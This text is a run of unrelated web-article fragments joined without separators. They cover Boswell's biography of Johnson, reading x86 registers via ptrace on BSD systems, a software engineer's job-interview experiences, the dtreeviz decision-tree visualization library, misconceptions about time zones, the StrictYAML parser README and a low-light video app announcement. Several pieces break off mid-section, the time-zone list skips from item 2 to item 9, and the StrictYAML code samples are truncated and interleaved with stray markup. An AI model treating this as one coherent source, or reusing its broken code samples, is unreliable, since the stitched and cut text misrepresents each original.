because he was a dunce, a parasite, and a coxcomb, they have made him immortal.</p></blockquote><p>The work succeeds partly because of its subject: if Johnson had not been so extraordinary, then airing all his dirty laundry would have just made him look bad.</p><blockquote><p>No man, surely, ever published such stories respecting persons whom he professed to love and revere. He would infallibly have made his hero as contemptible as he has made himself, had not his hero really possessed some moral and intellectual qualities of a very high order. The best proof that Johnson was really an extraordinary man is that his character, instead of being degraded, has, on the whole, been decidedly raised by a work in which all his vices and weaknesses are exposed.</p></blockquote><p>And finally, Boswell provided Johnson with a curious form of literary fame:</p><blockquote><p>The reputation of [Johnson's] writings, which he probably expected to be immortal, is every day fading; while those peculiarities of manner and that careless …</p></blockquote></div></div>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/cpu-context-switch.svg" alt="Context Switch"></p>

<p>In this article, I would like to shortly describe the methods used
to dump and restore the different kinds of registers on 32-bit
and 64-bit x86 CPUs.  The first part will focus on General Purpose
Registers, Debug Registers and Floating-Point Registers up to the XMM
registers provided by the SSE extension.  I will explain how their
values can be obtained via the <code>ptrace(2)</code> interface.</p>

<p>The <code>ptrace(2)</code> API is commonly used in all modern BSD systems
and Linux, as all of them derive it from the original form designed
and implemented in 4.3BSD.  The primary focus in this article is
on the FreeBSD and NetBSD systems.  Nevertheless, the users of other
Operating Systems such as OpenBSD, DragonFly BSD or Linux can still
benefit from this article as the basic principles are the same
and the code examples are intended to be easily adapted to other
platforms.</p>

<p>A single CPU (in modern hardware: CPU core or CPU thread,
if hyperthreading is available) can execute only one program thread
at a time.  In order to be able to run multiple processes and threads
quasi-simultaneously, the Operating System must perform <em>context
switching</em> — that is periodically suspend the currently running thread,
save its state, restore the saved state of another thread and resume it.
Saving and restoring the values of the processor’s registers play
an important part in context switching.  It is important that
this process is fully transparent to the process being switched,
and in a properly implemented kernel there should be no side effects
that are perceptible to the program.</p>

<p>The debugger may need to examine the register sets of the debugged
program for a number of reasons.  By inspecting the Program Counter,
it is able to determine the location in source code at which
the execution will continue, and by altering it it can control
the execution.  The Stack Pointer is necessary to introspect variables
stored on the stack, while the remaining registers can hold variables
themselves.</p>

<p>A special set of the x86 registers are the Debug Registers.  They are
not accessible to the program itself; however, they can be read
or written by the debugger.  They allow setting hardware assisted
breakpoints (instruction execute trap) on the code being executed,
and watchpoints (read and/or write operation trap) on the variables.</p>

<h2 id="general-purpose-registers-gpr">General Purpose Registers (GPR)</h2>

<h3 id="copying-gprs">Copying GPRs</h3>

<p>The term ‘General Purpose Registers’ is a bit ambiguous.
In the narrower sense, it means the few (8 on i386, 16 on amd64)
baseline registers that can be used to store arbitrary data (usually
integers or pointers).  In the wider sense it means all baseline
registers in the processor architecture, historically excluding
floating-point registers and special kinds of registers.  On x86, this
includes the ‘narrower sense’ general-purpose registers, the Program
Counter (EIP/RIP), segment registers and the flag register.</p>

<p>The majority of the General Purpose Registers can be copied directly,
e.g. using the <code>MOV</code> instruction, or pushed onto the stack
via <code>PUSH</code>.  The EIP/RIP register can be copied using the <code>LEA</code>
instruction, and restored via <code>JMP</code>.  The flag register can be pushed
onto the stack via <code>PUSHFD</code>/<code>PUSHFQ</code>, and afterwards popped from it
via <code>POPFD</code>/<code>POPFQ</code>.</p>

<p>The listing below demonstrates a program that grabs the values of all
amd64 GPRs at an arbitrary point during the execution and prints them
after returning from assembly.</p>

<h3 id="the-gpr-ptrace-2-api">The GPR ptrace(2) API</h3>

<p>Both FreeBSD and NetBSD use the <code>PT_GETREGS</code> request to get the values
of GPRs from the program, and <code>PT_SETREGS</code> to update them.
The requests take a pointer to <code>struct reg</code> as an argument.</p>

<p>On FreeBSD, both i386 and amd64 have the individual registers listed
as fields of the struct.  On NetBSD, i386 uses a regular structure,
while amd64 puts all values into an array whose indices are defined
in the headers as constants.</p>

<p>The listing below compares the structures used on FreeBSD and NetBSD.
Note that NetBSD/amd64 uses a special macro.  For example,
<code>greg(rdi RDI, 0)</code> defines <code>_REG_RDI</code>.</p>

<li>💚 a Principal Software Engineer (SDE) position at Microsoft in their Azure Data product; and</li>
<li>💚 a Principal Software Engineer (SDE) position at Microsoft in their Azure Storage product.</li>
</ul>

<p>That’s a total of 5 applications and talks with ~40 different people. Of those, the position in Azure Data vanished before I even interviewed, but I successfully <em>got to the offer stage for the other 4</em>. I entered this whole endeavor fixated on joining Facebook but… along the way, I uncovered exciting opportunities throughout, making my choice exceedingly difficult. In the end, I swerved towards the Azure Storage position for various reasons, but it’d have gone either way.</p>

<p>In this post, I want to be as honest and open as possible about <em>my personal situation</em> and how it related to the processes. As a result, some of the things I say might sound like a borderline rant—but that’s not the intention. Lastly, remember that interviewing always comes with the need to sign an NDA, so I cannot go into a lot of details.</p>



<p>Before we get into the processes, let’s talk about… career ladder <em>levels</em>! Uh, so exciting.</p>

<p>Levels are a very important topic for this discussion because each of the positions I applied to was attached to a specific level. The positions’ level significantly influenced how I went about zeroing in on my final choice. Beware that my view on this topic is through Google-tinted glasses and doesn’t necessarily apply to all companies—although I believe it does for the companies I talked to.</p>

<p>You see, recruiters and higher-level peers will often tell you not to get obsessed with levels or promotion: <em>“levels don’t matter”</em>, they’ll happily say. In principle, the people you work with know how you work in practice so the level you are at is irrelevant, and higher compensation can be achieved without promotion. Yes, compensation is weird: you can be paid more at a lower level by constantly exceeding expectations than at a higher level by just cruising.</p>

<p>In reality, however, I believe levels <em>do</em> matter a lot, even for an Individual Contributor (IC, non-manager) position. Here is why:</p>

<ul>
<li><p>Being at a higher level influences the kind of opportunities you are <em>exposed</em> to work on. You’d like to think that expertise and recognition do that instead: and they definitely do, but only within the realm of your team. Once you have to deal with teams and managers that don’t know you personally, the level you hold conveys that information. And thus the same applies when you land at a new company where nobody knows anything about you.</p></li>

<li><p>Being at a higher level grants you extra responsibilities and expectations—and I say <em>grant</em> because I think those are great traits. I personally want to grow in these areas, and I know that getting a higher title will subconsciously influence me to behave differently, just as it happened once I go the not-officially-recognized Tech Lead job within my team.</p></li>
</ul>

<p>NOTE: This is a good chance to visit <a href="https://www.levels.fyi/">levels.fyi</a>. Familiarize yourself with how levels map across companies and how they overlap across them. What’s <strong>not</strong> depicted there are the actual responsibilities of each level, nor that level compensation bans overlap <em>within a company</em>.</p>

<p>You might be wondering why any of this is important during the interviewing process. In fact, if all you care about is higher compensation, then this isn’t very important.</p>

<p>For me, though, my personal situation was problematic in finding the right position. I had been at the Senior (L5) level at Google for 5 years now, trying to make the jump into Staff (L6) territory for at least 3 of those years. My management chain and direct peers had been supportive of this promotion for quite a while now, and I am convinced my work did too. As a result, my compensation matched that: I was at the top of the Senior level band.</p>

<p>This unofficial recognition, however, is not reflected anywhere: you have to believe me at face value. For anyone that doesn’t know me within or outside the company, I’m an L5—and that can mean <em>a lot</em> of different things because of how broad levels are. One might be at the lower level, struggling to keep up with the demands and being paid the bare minimum; one can be in the middle, having a comfortable and non-stressful life with a good salary; and one can be at the top, trying to make the leap into the next band.</p>

<p>Unfortunately for me, the jump into the Staff level didn’t materialize at Google, dare I say… due to process failures. Promotions are a game and it is a game I did not play well; keep that in mind if you want them. But I didn’t want the job change to <em>feel</em> like a step down. <strong>My goal was to get hired as a Google L6-equivalent position elsewhere</strong> to properly reflect my skills, to make me uncomfortable enough to grow new skills, and to not have to prove myself all over again, which would take a long time.</p>



<p>Dealing with different companies at the same time was an exhausting, but important, process. As a reminder: if you want to have any leverage during offer negotiations, you ought to have other offers on the table. In the end, and as we shall see later, these weren’t very useful for my own negotiations (other things were), but they were eye-opening as I got to witness that there are exciting opportunities everywhere.</p>

<p>Given the many people I talked to (about 40) and the length of the process, I took copious notes each time I interacted with anyone. Specifically, I captured the names of each person I talked to and what they did at each company. I also captured anything the recruiters said in order to prevent future misunderstandings, because sometimes they contradicted what others had previously said.</p>

<p>Below is the full timeline. I know it’s long but I want to show how all the processes interwove. To that end, I have color- and shape-coded entries: Facebook is 🟦, Twitter is ⚫, and Microsoft is 💚:</p>

<p>Decision trees are the fundamental building block of <a href="http://explained.ai/gradient-boosting/index.html">gradient boosting machines</a> and <a href="https://en.wikipedia.org/wiki/Random_forest">Random Forests</a>™, probably the two most popular machine learning models for structured data.  Visualizing decision trees is a tremendous aid when learning how these models work and when interpreting models.  Unfortunately, current visualization packages are rudimentary and not immediately helpful to the novice. For example, we couldn't find a library that visualizes how decision nodes split up the feature space. It is also uncommon for libraries to support visualizing a specific feature vector as it weaves down through a tree's decision nodes; we could only find one image showing this.</p>

<p>So, we've created a general package for <a href="https://github.com/scikit-learn/scikit-learn">scikit-learn</a> decision tree visualization and model interpretation, which we'll be using heavily in an upcoming <a href="https://mlbook.explained.ai/">machine learning book</a> (written with <a href="http://www.fast.ai/about/#jeremy">Jeremy Howard</a>).  Here's a sample visualization for a tiny decision tree (click to enlarge):</p>

<p><a href="https://explained.ai/decision-tree-viz/images/samples/wine-TD-2.svg"><img src="https://explained.ai/decision-tree-viz/images/samples/wine-TD-2.svg" width="70%"></a></p>

<p>This article demonstrates the results of this work, details the specific choices we made for visualization, and outlines the tools and techniques used in the implementation. The visualization software is part of a nascent Python machine learning library called <a href="https://github.com/parrt/dtreeviz">dtreeviz</a>.  We assume you're familiar with the basic mechanism of decision trees if you're interested in visualizing them, but let's start with a brief summary so that we're all using the same terminology. (If you're not familiar with decision trees, check out <a href="http://course.fast.ai/ml">fast.ai's Introduction to Machine Learning for Coders MOOC</a>.)</p>



<h2 id="sec:1.1">1.1 Decision tree review</h2>


<p>A decision tree is a machine learning model based upon binary trees (trees with at most a left and right child).  A decision tree learns the relationship between observations in a training set, represented as feature vectors <span>x</span> and target values <span>y</span>, by examining and condensing training data into a binary tree of interior nodes and leaf nodes.  (Notation: vectors are in bold and scalars are in italics.)</p>

<p>Each leaf in the decision tree is responsible for making a specific prediction. For regression trees, the prediction is a value, such as price.  For classifier trees, the prediction is a target category (represented as an integer in scikit), such as cancer or not-cancer. A decision tree carves up the feature space into groups of observations that share similar target values and each leaf represents one of these groups.  For regression, similarity in a leaf means a low variance among target values and, for classification, it means that most or all targets are of a single class.</p>

<p>Any path from the root of the decision tree to a specific leaf predictor passes through a series of (internal) decision nodes. Each decision node compares a single feature's value in <span>x</span>, <span>x<sub>i</sub></span>, with a specific <i>split point</i> value learned during training. For example, in a model predicting apartment rent prices, decision nodes would test features such as the number of bedrooms and number of bathrooms. (See <b>Section 1.5.3</b> <i>Visualizing tree interpretation of a single observation</i>.) Even in a classifier with discrete target values, decision nodes still compare numeric <i>feature</i> values because scitkit's decision tree implementation assumes that all features are numeric. Categorical variables must be <a href="https://machinelearningmastery.com/how-to-one-hot-encode-sequence-data-in-python/">one hot encoded</a>, <a href="https://www.analyticsvidhya.com/blog/2015/11/easy-methods-deal-categorical-variables-predictive-modeling/">binned</a>, <a href="http://forums.fast.ai/t/to-label-encode-or-one-hot-encode/6057">label encoded</a>, etc... </p>

<p>To train a decision node, the model examines a subset of the training observations (or the full training set at the root). The node's feature and split point within that feature space are chosen during training to split the observations into left and right buckets (subsets) to maximize similarity as defined above. (This selection process is generally done through exhaustive comparison of features and  feature values.) The left bucket has observations whose <span>x<sub>i</sub></span> feature values are all less than the split point and the right bucket has observations whose <span>x<sub>i</sub></span> is greater than the split point.   Tree construction proceeds recursively by creating decision nodes for the left bucket and the right bucket.  Construction stops when some stopping criterion is reached, such as having less than five observations in the node.</p>



<h2 id="sec:1.2">1.2 The key elements of decision tree visualization</h2>


<p>Decision tree visualizations should highlight the following important elements, which we demonstrate below.</p>
<ul>
<li>Decision node <b>feature versus target value</b> distributions (which we call feature-target space in this article). We want to know how separable the target values are based upon the feature and a split point.</li>
<li>Decision node <b>feature name and feature split value</b>.  We need to know which feature each decision node is testing and where in that space the nodes splits the observations.</li>
<li><b>Leaf node purity</b>, which affects our prediction confidence. Leaves with low variance among the target values (regression) or an overwhelming majority target class (classification) are much more reliable predictors.</li>
<li><b>Leaf node prediction value</b>.  What is this leaf actually predicting from the collection of target values?</li>
<li><b>Numbers of samples in decision nodes</b>.  Sometimes it's useful to know where all most of the samples are being routed through the decision nodes.</li>
<li><b>Numbers of samples in leaf nodes</b>.  Our goal is a decision tree with fewer, larger and purer leaves. Nodes with too few samples are possible indications of overfitting.</li>
<li>How a specific feature vector is <b>run down the tree</b> to a leaf. This helps explain why a particular feature vector gets the prediction it does. For example, in a regression tree predicting apartment rent prices, we might find a feature vector routed into a high predicted price leaf because of a decision node that checks for more than three bedrooms.</li>
</ul>

<p>Before digging into the previous state-of-the-art visualizations, we'd like to give a little spoiler to show what's possible. This section highlights some samples visualizations we built from scikit regression and classification decision trees on a few data sets.

With more work, you can find visualizations for <a href="http://scikit-learn.org/stable/modules/tree.html">R</a> and even <a href="http://support.sas.com/documentation/cdl/en/vaug/68027/HTML/default/viewer.htm#n0q3i0zwng79kin1kb1zvpo9k312.htm">SAS</a> and <a href="https://www.ibm.com/support/knowledgecenter/en/SS4QC9/com.ibm.solutions.wa_an_overview.2.0.0.doc/wa_discover_viz_expl_insigths_dec_tree.html">IBM</a>. In this section, we collect the various decision tree visualizations we could find and compare them to the visualizations made by our <span>dtreeviz</span> library. We give a more detailed discussion of our visualizations in the next section.</p>

<p>Let's start with the <a href="http://scikit-learn.org/stable/modules/tree.html">default scitkit visualization</a> of a decision tree on the well-known <a href="http://scikit-learn.org/stable/modules/generated/sklearn.datasets.load_iris.html#sklearn.datasets.load_iris">Iris</a> data set (click on images to enlarge).</p>

<p>The scikit tree does a good job of representing the tree structure, but we have a few quibbles.  The colors aren't the best and it's not immediately obvious why some of the nodes are colored and some aren't.  If the colors represent predicted class for this classifier, one would think just the leaves would be colored because only leaves have predictions. (It turns out the non-colored nodes have no majority prediction.) Including the gini coefficient (certainty score) costs space and doesn't help with interpretation. The count of samples of the  various target classes in each node is somewhat useful, but a histogram would be even better. A target class color legend would be nice.  Finally, using true and false as the edge labels isn't as clear as, say, labels <img src="https://explained.ai/decision-tree-viz/images/eqn-524A50782178998021A88B8CD4C8DCD8-depth000.51.svg"> and <img src="https://explained.ai/decision-tree-viz/images/eqn-4EDC933D28BFE3F5EFFE94BF892DAD38-depth001.72.svg">. The most obvious difference is that our decision nodes show feature distributions as overlapping stacked-histograms, one histogram per target class. Also, our leaf size is proportional to the number of samples in that leaf.</p>

<p>Scikit uses the same visualization approach for decision tree regressors. For example, here is scikit's visualization using the <a href="http://scikit-learn.org/stable/modules/generated/sklearn.datasets.load_boston.html">Boston</a> data set, with <span>dtreeviz</span>'s version for comparison (click to enlarge images):</p>

<p>In the scikit tree, it's not immediately clear what the use of color implies, but after studying the image, darker images indicate higher predicted target values. As before, our decision nodes show the feature space distribution, this time using a feature versus target value scatterplot.  The leaves use strip plots to show the target value distribution; leaves with more dots naturally have a higher number of samples.</p>

<p><b>R</b> programmers also have access to a package for <a href="http://blog.revolutionanalytics.com/2013/06/plotting-classification-and-regression-trees-with-plotrpart.html">visualizing decision trees</a>, which gives similar results to scikit but with nicer edge labels:</p>

					<p>My aunt has a problem</p><p>She loves joining Zoom meetings, but they're all hosted in different time zones. It's hard to remember if she should add 4 hours, subtract 3, or what. She's not the most technical person, so google isn't an option. She has to ask for help.</p><p>Every. Single. Time.</p><p>And, for the less technically minded, it's also error-prone.</p><p>Last a couple weeks ago I thought:</p><p>What if event organizers could share a link that would do the work for you? If someone clicked on <a href="https://www.zainrizvi.io/blog/falsehoods-programmers-believe-about-time-zones/mytime.io/5pm/EST">mytime.at/5pm/EST</a>, they would see their local version of that time. It sounded simple enough.</p><p>I began coding. </p><figure><img src="https://www.zainrizvi.io/content/images/2020/10/image-5.png" alt="" srcset="https://www.zainrizvi.io/content/images/size/w600/2020/10/image-5.png 600w, https://www.zainrizvi.io/content/images/2020/10/image-5.png 699w"><figcaption>I later discovered mytime.io had already implemented a very similar thing, and run into the same pitfalls</figcaption></figure><p>I knew trying to manage time <a href="https://www.youtube.com/watch?v=-5wpm-gesOY">is a fool's errand</a>, but that's what datetime libraries are for. I would merely build an extra time zone conversion layer on top.</p><p>Surely that couldn't be complicated</p><p>...Right?</p><p>I soon discovered just how wrong I was. One after another, I kept learning the falsehood of yet another "fact" that had seemed obviously true. Eventually my original vision became literally impossible to pull off without making serious compromises (more about that in a future blog post).</p><p>Hopefully this list will help you avoid the landmines I stepped on. All the falsehoods below are ones I'd considered true at some point in my adult life. </p><p>Most of them I believed just one month ago.</p><h3 id="misconception-1-utc-offsets-go-from-12-to-12"><strong>Misconception #1: UTC offsets go from -12 to +12</strong></h3><p>Turns out, UTC offsets span from -12 to +14.

Same goes for UTC-11 and UTC+13, etc.</p><p>Why that crazy range? That was a result of pacific islanders decided they wanted to be on a specific side of the international date line. </p><p>It makes for a very jagged international date line</p><figure><img src="https://www.zainrizvi.io/content/images/2020/10/pasted-image-0--1-.png" alt="" srcset="https://www.zainrizvi.io/content/images/2020/10/pasted-image-0--1-.png 600w"></figure><h3 id="misconception-2-every-utc-offset-corresponds-to-exactly-one-time-zone">Misconception #2: Every UTC offset corresponds to exactly one time zone</h3><p>Here are 10 distinct time zones which are all at UTC+5:</p><ul><li>Aqtobe Time</li><li>Mawson Time</li><li>Maldives Time</li><li>Oral Time</li><li>Pakistan Standard Time</li><li>French Southern and Antarctic Time</li><li>Tajikistan Time</li><li>Turkmenistan Time</li><li>Uzbekistan Time</li><li>Yekaterinburg Time</li></ul><p>You might be wondering: if they’re all at the same UTC offset, why couldn’t all those countries just use the same time zone?

Here are some standards I discovered, there may be more:</p><h4 id="common-name">Common name</h4><p>These are the traditional time zone names we’re used to. Example: Pacific Standard Time.</p><p>But I don't know if there's an official term for these names, they just that unstandardized.</p><h4 id="iana-zone-keys">IANA zone keys</h4><p>This is as close to the official standard as you can get. It's not at all official, but it's something the developer community has rallied around.</p><p>It's a <a href="https://www.iana.org/time-zones">painstakingly maintained database</a> which contains all known time zone data representing the entire history of local time for places around the globe. &nbsp;It doesn't give any zone a name though, preferring to use the name of the most prominent city in there, which leads to:</p><h4 id="prominent-city-based">Prominent city based</h4><p>This one is "<a href="https://twitter.com/pganssle/status/1319794747876253697">basically bad UI that derives from the IANA zone keys</a>"</p><p>Full time zone names come with naming complications, which we discussed above. If that wasn't enough fun, there's also the political implications of recognizing certain time zones such as Israel Standard Time.</p><p>Some developers took the safer route and identified time zones only by the name of a prominent city in it, not bothering to map it to a common name. That's why the Ubuntu time zone picker makes you select "New York'' instead of Eastern Standard Time.</p><figure><img src="https://www.zainrizvi.io/content/images/2020/10/image-4.png" alt="" srcset="https://www.zainrizvi.io/content/images/size/w600/2020/10/image-4.png 600w, https://www.zainrizvi.io/content/images/2020/10/image-4.png 826w" sizes="(min-width: 720px) 720px"></figure><h4 id="forget-time-zones-use-the-raw-utc-offset">Forget time zones, use the raw UTC offset</h4><p>W3's international standard gave up on the notion of time zones and declared that engineers should only store a timestamp's<a href="https://www.w3.org/TR/NOTE-datetime"> raw UTC offset</a>.</p><h4 id="gps-coordinates">GPS Coordinates</h4><p>Fun fact: Many APIs for getting a region's UTC offset only want a UTC time and latitude/longitude coordinates. This lets them define any moment unambiguously and not have to worry about Daylight Saving Time.</p><p>If you squint your eyes a bit, you could consider this a fourth standard.</p><h3 id="misconception-9-daylight-saving-time-starts-at-the-same-time-every-year">Misconception #9: <strong>Daylight Saving Time starts at the same time every year</strong></h3><p>Did you think this would be the one thing world powers agree on? Each country choose when to start it's own DST</p><h3 id="misconception-10-a-country-s-time-zone-never-changes">Misconception #10: <strong>A country's time zone never changes</strong></h3><p>Almost every year some country will pass a law to edit their time zone.</p><p>In a particularly memorable example, a few years ago the Samoan islands wanted to be on the other side of the international date line to get the same weekends as their Australian trading partners. So on midnight Dec 29th, they changed their UTC offset from -11 to +13 UTC, skipping Dec 30th and going straight to Dec 31st.</p><p>Samoan citizens had one less day to celebrate the holidays that year.</p><p>On the plus side, just 40 miles away the American Samoa Islands stayed on the other side of the international date line. Now Samoans can celebrate new years on the Western Island, and then boat over to American Samoa for a second new year’s party the next night.</p><figure><img src="https://www.zainrizvi.io/content/images/2020/10/pasted-image-0--2-.png" alt="" srcset="https://www.zainrizvi.io/content/images/size/w600/2020/10/pasted-image-0--2-.png 600w, https://www.zainrizvi.io/content/images/size/w1000/2020/10/pasted-image-0--2-.png 1000w, https://www.zainrizvi.io/content/images/2020/10/pasted-image-0--2-.png 1169w" sizes="(min-width: 720px) 720px"></figure><h3 id="misconception-11-a-country-stays-in-the-same-time-zone-during-daylight-saving-time">Misconception #11: <strong>A country stays in the same time zone during Daylight Saving Time</strong></h3><p>Funny thing about DST, it doesn't actually change the time zone's UTC offset. &nbsp;Instead, Daylight Saving Time countries switch to a different time zone, with a different name.</p><p>For example:</p><p>Texas goes from Central Standard Time to Central Daylight Time.</p><p>Chile goes from Chile Standard Time to Chile Summer Time</p><figure><img src="https://www.zainrizvi.io/content/images/2020/10/dst-shift.jpeg" alt="" srcset="https://www.zainrizvi.io/content/images/size/w600/2020/10/dst-shift.jpeg 600w, https://www.zainrizvi.io/content/images/size/w1000/2020/10/dst-shift.jpeg 1000w, https://www.zainrizvi.io/content/images/size/w1600/2020/10/dst-shift.jpeg 1600w, https://www.zainrizvi.io/content/images/2020/10/dst-shift.jpeg 2168w" sizes="(min-width: 720px) 720px"></figure><h3 id="misconception-12-daylight-saving-time-starts-around-march-and-ends-around-october">Misconception #12: <strong>Daylight Saving Time starts around March and ends around October</strong></h3><p>The Southern hemisphere has their summer in the other half of the year.

<p>StrictYAML is a <a href="https://en.wikipedia.org/wiki/Type_safety">type-safe</a> YAML parser
that parses and validates a <a href="https://hitchdev.com/strictyaml/features-removed">restricted subset</a> of the <a href="https://hitchdev.com/strictyaml/what-is-yaml">YAML</a>
specification.</p>

<p>Priorities:</p>

<ul>
<li>Beautiful API</li>
<li>Refusing to parse <a href="https://hitchdev.com/strictyaml/features-removed">the ugly, hard to read and insecure features of YAML</a> like <a href="https://hitchdev.com/strictyaml/why/implicit-typing-removed">the Norway problem</a>.</li>
<li>Strict validation of markup and straightforward type casting.</li>
<li>Clear, readable exceptions with <strong>code snippets</strong> and <strong>line numbers</strong>.</li>
<li>Acting as a near-drop in replacement for pyyaml, ruamel.yaml or poyo.</li>
<li>Ability to read in YAML, make changes and write it out again with comments preserved.</li>
<li><a href="https://hitchdev.com/strictyaml/why/speed-not-a-priority">Not speed</a>, currently.</li>
</ul>

<p>Simple example:</p>
<div><pre><code data-lang="yaml"><span># All about the character</span><span>
</span><span></span>name<span>:</span><span> </span>Ford<span> </span>Prefect<span>
</span><span></span>age<span>:</span><span> </span><span>42</span><span>
</span><span></span>possessions<span>:</span><span>
</span><span></span>-<span> </span>Towel</code></pre></div><div><pre><code data-lang="python"><span>from</span> <span>strictyaml</span> <span>import</span> <span>load</span><span>,</span> <span>Map</span><span>,</span> <span>Str</span><span>,</span> <span>Int</span><span>,</span> <span>Seq</span><span>,</span> <span>YAMLError</span></code></pre></div>
<p>Default parse result:</p>
<div><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> <span>load</span><span>(</span><span>yaml_snippet</span><span>)</span>
<span>YAML</span><span>(</span><span>OrderedDict</span><span>([(</span><span>'name'</span><span>,</span> <span>'Ford Prefect'</span><span>),</span> <span>(</span><span>'age'</span><span>,</span> <span>'42'</span><span>),</span> <span>(</span><span>'possessions'</span><span>,</span> <span>[</span><span>'Towel'</span><span>])]))</span></code></pre></div>
<p>All data is string, list or OrderedDict:</p>
<div><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> <span>load</span><span>(</span><span>yaml_snippet</span><span>)</span><span>.</span><span>data</span>
<span>OrderedDict</span><span>([(</span><span>'name'</span><span>,</span> <span>'Ford Prefect'</span><span>),</span> <span>(</span><span>'age'</span><span>,</span> <span>'42'</span><span>),</span> <span>(</span><span>'possessions'</span><span>,</span> <span>[</span><span>'Towel'</span><span>])])</span></code></pre></div>
<p>Quickstart with schema:</p>
<div><pre><code data-lang="python"><span>from</span> <span>strictyaml</span> <span>import</span> <span>load</span><span>,</span> <span>Map</span><span>,</span> <span>Str</span><span>,</span> <span>Int</span><span>,</span> <span>Seq</span><span>,</span> <span>YAMLError</span>

<span>schema</span> <span>=</span> <span>Map</span><span>({</span><span>"name"</span><span>:</span> <span>Str</span><span>(),</span> <span>"age"</span><span>:</span> <span>Int</span><span>(),</span> <span>"possessions"</span><span>:</span> <span>Seq</span><span>(</span><span>Str</span><span>())})</span></code></pre></div>
<p>42 is now parsed as an integer:</p>
<div><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> <span>person</span> <span>=</span> <span>load</span><span>(</span><span>yaml_snippet</span><span>,</span> <span>schema</span><span>)</span>
<span>&gt;&gt;&gt;</span> <span>person</span><span>.</span><span>data</span>
<span>OrderedDict</span><span>([(</span><span>'name'</span><span>,</span> <span>'Ford Prefect'</span><span>),</span> <span>(</span><span>'age'</span><span>,</span> <span>42</span><span>),</span> <span>(</span><span>'possessions'</span><span>,</span> <span>[</span><span>'Towel'</span><span>])])</span></code></pre></div>
<p>A YAMLError will be raised if there are syntactic problems, violations of your schema or use of disallowed YAML features:</p>
<div><pre><code data-lang="yaml"><span># All about the character</span><span>
</span><span></span>name<span>:</span><span> </span>Ford<span> </span>Prefect<span>
</span><span></span>age<span>:</span><span> </span><span>42</span></code></pre></div>
<p>For example, a schema violation:</p>
<div><pre><code data-lang="python"><span>try</span><span>:</span>
    <span>person</span> <span>=</span> <span>load</span><span>(</span><span>yaml_snippet</span><span>,</span> <span>schema</span><span>)</span>
<span>except</span> <span>YAMLError</span> <span>as</span> <span>error</span><span>:</span>
    <span>print</span><span>(</span><span>error</span><span>)</span></code></pre></div><div><pre><code data-lang="yaml">while<span> </span>parsing<span> </span>a<span> </span>mapping<span>

</span><span>    </span>^<span> </span>(line<span>:</span><span> </span><span>3</span>)</code></pre></div>
<p>If parsed correctly:</p>
<div><pre><code data-lang="python"><span>from</span> <span>strictyaml</span> <span>import</span> <span>load</span><span>,</span> <span>Map</span><span>,</span> <span>Str</span><span>,</span> <span>Int</span><span>,</span> <span>Seq</span><span>,</span> <span>YAMLError</span>

<p>You can modify values and write out the YAML with comments preserved:</p>
<div><pre><code data-lang="python"><span>person</span> <span>=</span> <span>load</span><span>(</span><span>yaml_snippet</span><span>,</span> <span>schema</span><span>)</span>
<span>person</span><span>[</span><span>'age'</span><span>]</span> <span>=</span> <span>43</span>

</span><span></span>possessions<span>:</span><span>
</span><span></span>-<span> </span>Towel</code></pre></div>
<p>As well as look up line numbers:</p>
<div><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> <span>person</span> <span>=</span> <span>load</span><span>(</span><span>yaml_snippet</span><span>,</span> <span>schema</span><span>)</span>

<p>Hey everyone, <br>

for the past few months we have been working on a new product, and today we’re finally ready to show it to you.
</p>

<div><p>As you probably know, at NeuralCam we have a <a href="https://apps.apple.com/us/app/neuralcam-nightmode/id1474856599" target="_blank">photo NightMode app</a> that’s recognized as the leading night mode solution for iPhones without a built-in photo Night Mode. Ever since the launch of our night mode app, a question kept popping up from our users: <i>“can you build a night mode app for video?”</i>, they asked.

We’ve pondered this for a while. Unlike photography, there is no obvious straightforward way to build night mode for video. In the case of photos, night mode usually means taking multiple shots with relatively long exposure and combining them into one high quality image. Then brightening and post-processing it for a final look. 

 </p></div>



<p><b>Video</b> is a different beast: you can’t just shoot multiple frames and combine them because you’re limited by both the maximum exposure time a frame can have and by the maximum processing time per frame (milliseconds instead of seconds in the case of real-time video). 

</p>

<p>Clearly, a very different approach is needed. We’ve explored everything from classic to AI-powered video processing techniques and we think we found the right mix of tech that results in much improved low light videos. After months of researching, hacking and developing, we’re proud to present NeuralCam NightVideo, our (and perhaps the world’s first) <b>Video Night Mode</b> app.

<h3 id="when-they-ghost-mid-project">Night Mode Video</h3>

<p>So how can we build Video NightMode? Where do we get started and why can’t we just take a normal video and brighten it up? Well, because it would look really bad.
</p>

<p>The biggest problem in low light videography (and photography for that matter) is the presence of noise. There’s just too little amount of light hitting the image sensor and this lack of information results in a flickering mess of pixels with different light intensities and colors appearing especially in the darker areas of the scene - not a pleasant view.
</p>
<p>In the case of the photography night mode, this noise is reduced by the mentioned frame merging process - which basically results in more information being added to the target frame. However, with video we don’t have the luxury of multiple frames and processing for seconds to do the processing so we’ll clearly have to find a very different approach. 

</p><h3 id="when-they-ghost-mid-project">Capturing and AI frame-boosting</h3>

<p>The first thing we’re doing is to try to capture the most light inside each frame, which naturally results in less noisy frames. 

</p>

<p>As a standard practice, videos are shot at a shutter speed of no more than 1/24 to keep moving objects sharp and the video smooth. But this also means that this is the maximum amount of time that light can reach the sensor.
</p>

<p>We’ve looked very closely at this problem and figured that there might be a way to let more light in while maintaining the smooth look of the video, namely a combination of longer exposure times and frame interpolation. This way we can use exposure times longer than 1/24 depending on the amount of available light, and then in order to keep the video looking smooth, we generate additional frames using a proprietary Machine Learning powered Video Interpolation algorithm that we’ve built especially for this purpose.</p>

<p>
 The result is a smooth video with a tiny amount of blur - depending on the used settings - and generally a nice “night video” look.

</p>

</p>



<h3 id="when-they-ghost-mid-project">AI Powered Video Denoising</h3>


<p>Doing the capturing part this way we’ve got higher quality frames, but these generally still have a lot of noise so what we’ll do next is to try to get rid of that.
</p>

<p>It turns out that classic denoising methods aren’t good enough for this case, they usually blur the whole image, including edges and are helpless at the noise levels present in low light shots taken with a smartphone camera. Also, they’re quite slow as well.
</p>

<p>To solve this problem we’ve built a Machine Learning-based denoising algorithm. Specially developed for the iPhone camera, it removes even the heaviest noise and does so selectively and adaptively only on the areas of the image where noise is present. The result is a much cleaner look in the bright areas of the video and a massive reduction of the ugly flickering effect in the darker parts of the image.

<h3>Brightening</h3>


